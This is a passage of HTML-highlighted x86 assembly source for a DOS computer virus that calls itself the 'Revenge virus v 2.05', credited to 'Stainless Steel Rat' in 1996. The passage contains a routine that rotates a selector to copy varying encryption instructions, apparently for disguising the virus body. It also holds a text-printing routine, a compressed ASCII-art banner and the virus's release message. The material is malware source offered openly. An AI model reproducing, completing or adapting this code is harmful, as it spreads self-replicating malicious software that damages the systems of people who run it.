        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">print_string</span><span class="sc0">

</span><span class="sc5">end_print_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">skip_chars</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Number of chars to skip</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; 2 bytes per each char</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Skip chars</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">print_string</span><span class="sc0">

</span><span class="sc5">encrypt_i1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">encrypt_instructions</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">enc_inst</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">enc_selector</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">enc_selector</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_enc_inst</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">copy_enc_inst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">enc_selector</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">this_is</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'THIS IS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">of_SSR</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'OF'</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc12">'STAINLESS STEEL RAT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">revenge</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; Compressed graphic</span><span class="sc0">
</span><span class="sc1">; Line 1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ü'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ü'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ü'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 3</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 5</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 6</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 7</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'±'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 9</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc4">,</span><span class="sc12">'Ş'</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'ß'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 11</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc12">'Û'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Line 12</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'~'</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Uncompressed graphic:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                          T  H  I  S     I  S</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     Ş±± ±±±±±         Ş±±</span><span class="sc0">
</span><span class="sc1">;     Ş±±±ßßßÛ±± Ü±±±±±  Ş±±    Ş±±  Ü±±±±±  Ş±± ±±±±   ±±±± ±±  Ü±±±±±</span><span class="sc0">
</span><span class="sc1">;     Û±±±   Ş±±Ş±±ßßÛ±± Ş±±    Ş±± Ş±±ßßÛ±± Ş±±±ßßÛ±±Ş±±ßßß±±± Ş±±ßßÛ±±</span><span class="sc0">
</span><span class="sc1">;    Ş±±±   Ş±± Ş±±  Ş±±  Û±   Ş±±  Ş±±  Ş±± Ş±±   Ş±±Ş±±   Ş±± Ş±±  Ş±±</span><span class="sc0">
</span><span class="sc1">;    Û±±±±±±±  Ş±±±±±±±   Ş±±  Ş±± Ş±±±±±±±  Ş±±   Ş±± Û±±±±±±±Ş±±±±±±±</span><span class="sc0">
</span><span class="sc1">;   Ş±±± Ş±±   Ş±±±ßßß     Ş±± Ş±  Ş±±±ßßß   Ş±±   Ş±±  ßß±±±±±Ş±±±ßßß</span><span class="sc0">
</span><span class="sc1">;   Ş±±   Û±±   Û±±    ±    Ş±±Ş±   Û±±    ± Ş±±  Ş±±     ßßßÛ± Û±±    ±</span><span class="sc0">
</span><span class="sc1">;   Û±±    Û±±   Û±±±±±      Ş±±     Û±±±±±  Ş±±  Ş±±   ±   Ş±±  Û±±±±±</span><span class="sc0">
</span><span class="sc1">;  Ş±±±     Û±±   ßßßß        ßß      ßßßß    ßß   ßß  ±±   Ş±±   ßßßß</span><span class="sc0">
</span><span class="sc1">;  Û±±       Û±±                                       Ş±±±±±±</span><span class="sc0">
</span><span class="sc1">;  ßßß        Û±±                                       ßßßßß</span><span class="sc0">
</span><span class="sc1">;              Û±±</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    O  F           S  T  A  I  N  L  E  S  S    S  T  E  E  L     R  A  T</span><span class="sc0">

</span><span class="sc5">release_msg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'úúúúùùù Revenge virus v 2.05 released at 08.08.96 ùùùúúúú'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'úúúúùùù Copyright (c) 1996-97  2 Rats Techno Soft ùùùúúúú'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'úúúúùùù#'</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc12">'Written by#'</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc12">'ùùùúúúú'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'úúúúùùù#'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc12">'Stainless Steel Rat#'</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc12">'ùùùúúúú'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

